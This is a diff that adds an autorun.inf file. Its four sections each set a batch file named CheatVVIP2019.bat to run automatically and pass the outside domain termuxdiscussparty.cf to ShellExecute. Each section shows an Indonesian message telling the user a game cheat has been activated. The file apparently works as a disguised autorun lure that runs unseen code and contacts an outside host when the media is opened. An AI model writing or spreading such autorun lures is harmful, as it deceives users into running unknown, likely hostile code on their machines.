@@ -1,0 +1,19 @@
+[autorun]
+Open=CheatVVIP2019.bat
+shellexecute=termuxdiscussparty.cf
+action=Selamat cheat sudah diaktifkan.
+
+[autorun.Amd64]
+Open=CheatVVIP2019.bat
+shellexecute=termuxdiscussparty.cf
+action=Selamat cheat sudah diaktifkan.
+
+[autorun.arm32]
+Open=CheatVVIP2019.bat
+shellexecute=termuxdiscussparty.cf
+action=Selamat cheat sudah diaktifkan.
+
+[autorun.Armhf32]
+Open=CheatVVIP2019.bat
+shellexecute=termuxdiscussparty.cf
+action=Selamat cheat sudah diaktifkan.
